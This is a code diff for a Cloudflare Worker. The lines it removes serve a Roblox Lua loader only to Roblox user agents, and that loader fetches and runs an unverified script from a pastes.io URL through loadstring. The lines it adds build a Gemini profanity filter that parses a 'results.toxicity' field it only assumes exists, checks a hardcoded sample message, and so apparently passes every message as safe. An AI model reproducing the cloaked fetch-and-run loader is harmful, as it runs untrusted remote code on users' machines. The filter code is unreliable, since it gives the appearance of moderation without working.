@@ -1,67 +1,58 @@
+
+// worker.js
+
+// This function interacts with Gemini API to check for profanity or toxicity.
+async function queryGeminiAIForProfanity(text, apiKey) {
+  const API_URL = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=" + apiKey;
+
+  const response = await fetch(API_URL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      contents: [{
+        parts: [{ text: text }]
+      }]
+    })
+  });
+
+  if (!response.ok) {
+    throw new Error("Failed to contact Gemini API.");
+  }
+
+  const data = await response.json();
+  // Assuming Gemini returns a toxicity score or flagged content
+  const toxicity = data?.results?.toxicity || 0;
+  return toxicity;
+}
+
+// Cloudflare Worker entry point
 addEventListener('fetch', event => {
-  event.respondWith(handleRequest(event.request))
-})
+  event.respondWith(handleRequest(event.request));
+});
 
 async function handleRequest(request) {
-  // Only handle requests to the root ('/') route
-  const url = new URL(request.url)
-  if (url.pathname !== '/') {
-    return new Response('Not Found', { status: 404 })
+  const url = new URL(request.url);
+
+  // Simulate a user input text (You can modify this to get text from the request body)
+  const userMessage = "This is a message with badword1 and other content.";
+  
+  // Retrieve the Gemini API key from Cloudflare Workers' environment
+  const apiKey = GEMINI_API_KEY;
+
+  try {
+    const toxicityScore = await queryGeminiAIForProfanity(userMessage, apiKey);
+    const toxicityThreshold = 0.7; // Adjust based on what level you consider "toxic"
+    
+    if (toxicityScore > toxicityThreshold) {
+      return new Response("This message contains inappropriate content.", {
+        status: 400
+      });
+    } else {
+      return new Response("This message is safe.", { status: 200 });
+    }
+  } catch (error) {
+    return new Response("Error detecting toxicity: " + error.message, { status: 500 });
   }
-
-  // Check if the request method is GET
-  if (request.method !== 'GET') {
-    return new Response('Method Not Allowed', { status: 405 })
-  }
-
-  // Get the User-Agent from the request headers
-  const userAgent = request.headers.get('User-Agent')
-
-  // Check if the User-Agent contains "Roblox" (common in Roblox user agents)
-  if (!userAgent || !userAgent.includes('Roblox')) {
-    // Return an HTML response for incorrect User-Agent
-    const htmlContent = `
-      <!DOCTYPE html>
-      <html lang="en">
-      <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Access Denied</title>
-        <style>
-          body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 50px;
-            color: #333;
-          }
-          h1 {
-            color: #e74c3c;
-          }
-        </style>
-      </head>
-      <body>
-        <h1>Access Denied</h1>
-        <p>Your is not allowed to access this resource. Only clients are permitted.</p>
-      </body>
-      </html>
-    `;
-    return new Response(htmlContent, {
-      headers: { 'Content-Type': 'text/html' },
-      status: 403
-    });
-  }
-
-  // Basic Roblox Lua Script
-  const robloxScript = `
--- Roblox Lua Script
---[[
-  WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
-loadstring(game:HttpGet("https://pastes.io/raw/djjdjd-570"))()
-`;
-
-  // Respond with the Roblox Lua script
-  return new Response(robloxScript, {
-    headers: { 'Content-Type': 'text/plain' }
-  });
 }
